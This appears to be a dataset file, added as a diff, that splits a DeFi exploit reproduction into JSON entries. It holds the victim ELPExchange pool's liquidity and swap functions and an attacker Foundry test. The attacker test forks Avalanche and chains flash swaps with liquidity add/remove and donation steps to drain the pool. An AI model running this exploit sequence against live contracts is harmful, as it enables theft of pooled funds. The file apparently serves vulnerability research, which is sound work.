@@ -1,0 +1,219 @@
+[
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "addLiquidity",
+    "original_code": "    function addLiquidity(\n        uint256 _baseTokenQtyDesired,\n        uint256 _quoteTokenQtyDesired,\n        uint256 _baseTokenQtyMin,\n        uint256 _quoteTokenQtyMin,\n        address _liquidityTokenRecipient,\n        uint256 _expirationTimestamp\n    ) external nonReentrant() isNotExpired(_expirationTimestamp) {\n        uint256 totalSupply = this.totalSupply();\n        MathLib.TokenQtys memory tokenQtys =\n            MathLib.calculateAddLiquidityQuantities(\n                _baseTokenQtyDesired,\n                _quoteTokenQtyDesired,\n                _baseTokenQtyMin,\n                _quoteTokenQtyMin,\n                IERC20(baseToken).balanceOf(address(this)),\n                totalSupply,\n                internalBalances\n            );\n\n        internalBalances.kLast =\n            internalBalances.baseTokenReserveQty *\n            internalBalances.quoteTokenReserveQty;\n\n        if (tokenQtys.liquidityTokenFeeQty != 0) {\n            // mint liquidity tokens to fee address for k growth.\n            _mint(\n                IExchangeFactory(exchangeFactoryAddress).feeAddress(),\n                tokenQtys.liquidityTokenFeeQty\n            );\n        }\n\n        bool isExchangeEmpty = totalSupply == 0;\n        if (isExchangeEmpty) {\n            // check if this the first LP provider, if so, we need to lock some minimum dust liquidity.\n            require(\n                tokenQtys.liquidityTokenQty > MINIMUM_LIQUIDITY,\n                \"Exchange: INITIAL_DEPOSIT_MIN\"\n            );\n            unchecked {\n                tokenQtys.liquidityTokenQty -= MINIMUM_LIQUIDITY;\n            }\n            _mint(address(this), MINIMUM_LIQUIDITY); // mint to this address, total supply will never be 0 again\n        }\n\n        _mint(_liquidityTokenRecipient, tokenQtys.liquidityTokenQty); // mint liquidity tokens to recipient\n\n        if (tokenQtys.baseTokenQty != 0) {\n            // transfer base tokens to Exchange\n            IERC20(baseToken).safeTransferFrom(\n                msg.sender,\n                address(this),\n                tokenQtys.baseTokenQty\n            );\n\n            if (isExchangeEmpty) {\n                require(\n                    IERC20(baseToken).balanceOf(address(this)) ==\n                        tokenQtys.baseTokenQty,\n                    \"Exchange: FEE_ON_TRANSFER_NOT_SUPPORTED\"\n                );\n            }\n        }\n\n        if (tokenQtys.quoteTokenQty != 0) {\n            // transfer quote tokens to Exchange\n            IERC20(quoteToken).safeTransferFrom(\n                msg.sender,\n                address(this),\n                tokenQtys.quoteTokenQty\n            );\n        }\n\n        emit AddLiquidity(\n            msg.sender,\n            tokenQtys.baseTokenQty,\n            tokenQtys.quoteTokenQty\n        );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "allowance",
+    "original_code": "    function allowance(address owner, address spender) public view virtual override returns (uint256) {\n        return _allowances[owner][spender];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "approve",
+    "original_code": "    function approve(address spender, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _approve(owner, spender, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "balanceOf",
+    "original_code": "    function balanceOf(address account) public view virtual override returns (uint256) {\n        return _balances[account];\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "decimals",
+    "original_code": "    function decimals() public view virtual override returns (uint8) {\n        return 18;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "deposit",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "internalBalances",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "name",
+    "original_code": "    function name() public view virtual override returns (string memory) {\n        return _name;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "owner",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "removeLiquidity",
+    "original_code": "    function removeLiquidity(\n        uint256 _liquidityTokenQty,\n        uint256 _baseTokenQtyMin,\n        uint256 _quoteTokenQtyMin,\n        address _tokenRecipient,\n        uint256 _expirationTimestamp\n    ) external nonReentrant() isNotExpired(_expirationTimestamp) {\n        require(this.totalSupply() != 0, \"Exchange: INSUFFICIENT_LIQUIDITY\");\n        require(\n            _baseTokenQtyMin != 0 && _quoteTokenQtyMin != 0,\n            \"Exchange: MINS_MUST_BE_GREATER_THAN_ZERO\"\n        );\n\n        uint256 baseTokenReserveQty =\n            IERC20(baseToken).balanceOf(address(this));\n        uint256 quoteTokenReserveQty =\n            IERC20(quoteToken).balanceOf(address(this));\n\n        uint256 totalSupplyOfLiquidityTokens = this.totalSupply();\n        // calculate any DAO fees here.\n        uint256 liquidityTokenFeeQty =\n            MathLib.calculateLiquidityTokenFees(\n                totalSupplyOfLiquidityTokens,\n                internalBalances\n            );\n\n        // we need to factor this quantity in to any total supply before redemption\n        totalSupplyOfLiquidityTokens += liquidityTokenFeeQty;\n\n        uint256 baseTokenQtyToReturn =\n            (_liquidityTokenQty * baseTokenReserveQty) /\n                totalSupplyOfLiquidityTokens;\n        uint256 quoteTokenQtyToReturn =\n            (_liquidityTokenQty * quoteTokenReserveQty) /\n                totalSupplyOfLiquidityTokens;\n\n        require(\n            baseTokenQtyToReturn >= _baseTokenQtyMin,\n            \"Exchange: INSUFFICIENT_BASE_QTY\"\n        );\n\n        require(\n            quoteTokenQtyToReturn >= _quoteTokenQtyMin,\n            \"Exchange: INSUFFICIENT_QUOTE_QTY\"\n        );\n\n        // this ensures that we are removing the equivalent amount of decay\n        // when this person exits.\n        {\n            //scoping to avoid stack too deep errors\n            uint256 internalBaseTokenReserveQty =\n                internalBalances.baseTokenReserveQty;\n            uint256 baseTokenQtyToRemoveFromInternalAccounting =\n                (_liquidityTokenQty * internalBaseTokenReserveQty) /\n                    totalSupplyOfLiquidityTokens;\n\n            internalBalances.baseTokenReserveQty = internalBaseTokenReserveQty =\n                internalBaseTokenReserveQty -\n                baseTokenQtyToRemoveFromInternalAccounting;\n\n            // We should ensure no possible overflow here.\n            uint256 internalQuoteTokenReserveQty =\n                internalBalances.quoteTokenReserveQty;\n            if (quoteTokenQtyToReturn > internalQuoteTokenReserveQty) {\n                internalBalances\n                    .quoteTokenReserveQty = internalQuoteTokenReserveQty = 0;\n            } else {\n                internalBalances\n                    .quoteTokenReserveQty = internalQuoteTokenReserveQty =\n                    internalQuoteTokenReserveQty -\n                    quoteTokenQtyToReturn;\n            }\n\n            internalBalances.kLast =\n                internalBaseTokenReserveQty *\n                internalQuoteTokenReserveQty;\n        }\n\n        if (liquidityTokenFeeQty != 0) {\n            _mint(\n                IExchangeFactory(exchangeFactoryAddress).feeAddress(),\n                liquidityTokenFeeQty\n            );\n        }\n\n        _burn(msg.sender, _liquidityTokenQty);\n        IERC20(baseToken).safeTransfer(_tokenRecipient, baseTokenQtyToReturn);\n        IERC20(quoteToken).safeTransfer(_tokenRecipient, quoteTokenQtyToReturn);\n        emit RemoveLiquidity(\n            msg.sender,\n            baseTokenQtyToReturn,\n            quoteTokenQtyToReturn\n        );\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "swapQuoteTokenForBaseToken",
+    "original_code": "    function swapQuoteTokenForBaseToken(\n        uint256 _quoteTokenQty,\n        uint256 _minBaseTokenQty,\n        uint256 _expirationTimestamp\n    ) external nonReentrant() isNotExpired(_expirationTimestamp) {\n        require(\n            _quoteTokenQty != 0 && _minBaseTokenQty != 0,\n            \"Exchange: INSUFFICIENT_TOKEN_QTY\"\n        );\n\n        uint256 baseTokenQty =\n            MathLib.calculateBaseTokenQty(\n                _quoteTokenQty,\n                _minBaseTokenQty,\n                IERC20(baseToken).balanceOf(address(this)),\n                TOTAL_LIQUIDITY_FEE,\n                internalBalances\n            );\n\n        IERC20(quoteToken).safeTransferFrom(\n            msg.sender,\n            address(this),\n            _quoteTokenQty\n        );\n\n        IERC20(baseToken).safeTransfer(msg.sender, baseTokenQty);\n        emit Swap(msg.sender, 0, _quoteTokenQty, baseTokenQty, 0);\n    }\n}\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "symbol",
+    "original_code": "    function symbol() public view virtual override returns (string memory) {\n        return _symbol;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "totalSupply",
+    "original_code": "    function totalSupply() public view virtual override returns (uint256) {\n        return _totalSupply;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "transfer",
+    "original_code": "    function transfer(address to, uint256 amount) public virtual override returns (bool) {\n        address owner = _msgSender();\n        _transfer(owner, to, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "transferFrom",
+    "original_code": "    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) public virtual override returns (bool) {\n        address spender = _msgSender();\n        _spendAllowance(from, spender, amount);\n        _transfer(from, to, amount);\n        return true;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ELPExchange",
+    "source_type": "victim_contract",
+    "function_name": "withdraw",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "IS_TEST",
+    "original_code": "",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeArtifacts",
+    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeContracts",
+    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "excludeSenders",
+    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "failed",
+    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "joeCall",
+    "original_code": "    function joeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {\n        uint256 TICAmount = TIC.balanceOf(address(ELP));\n        uint256 USDC_EAmount = USDC_E.balanceOf(address(ELP));\n        uint256 _expirationTimestamp = 1_000_000_000_000;\n        ELP.addLiquidity(1e9, 0, 0, 0, address(this), _expirationTimestamp);\n        ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this), _expirationTimestamp);\n        USDC_E.transfer(address(ELP), USDC_E.balanceOf(address(ELP)));\n        ELP.removeLiquidity(ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp);\n        // USDC.E swap to TIC\n        ELPExchange.InternalBalances memory InternalBalance = ELP.internalBalances();\n        uint256 USDC_EReserve = InternalBalance.quoteTokenReserveQty;\n        ELP.swapQuoteTokenForBaseToken(USDC_EReserve * 100, 1, _expirationTimestamp);\n        TICAmount = TIC.balanceOf(address(this));\n        USDC_EAmount = USDC_E.balanceOf(address(this));\n        // TIC swap to USDC.e\n        ELP.addLiquidity(TICAmount, USDC_EAmount, 0, 0, address(this), _expirationTimestamp);\n        ELP.removeLiquidity(ELP.balanceOf(address(this)), 1, 1, address(this), _expirationTimestamp);\n        USDC_E.transfer(address(JPair), 774_353 * 1e6);\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "setUp",
+    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 23_563_709);\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifactSelectors",
+    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetArtifacts",
+    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetContracts",
+    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetInterfaces",
+    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSelectors",
+    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "targetSenders",
+    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "testExploit",
+    "original_code": "    function testExploit() public {\n        TIC.approve(address(ELP), type(uint256).max);\n        USDC_E.approve(address(ELP), type(uint256).max);\n        ELP.approve(address(ELP), type(uint256).max);\n        SPair.swap(51_112 * 1e18, 0, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker USDC.E balance after exploit\", USDC_E.balanceOf(address(this)), USDC_E.decimals()\n        );\n        emit log_named_decimal_uint(\"Attacker TIC balance after exploit\", TIC.balanceOf(address(this)), TIC.decimals());\n    }\n\n",
+    "description": ""
+  },
+  {
+    "contract/interface": "ContractTest",
+    "source_type": "attacker_contract",
+    "function_name": "uniswapV2Call",
+    "original_code": "    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        JPair.swap(766_685 * 1e6, 0, address(this), new bytes(1));\n        TIC.transfer(address(SPair), 51_624 * 1e18);\n    }\n\n",
+    "description": ""
+  }
+]
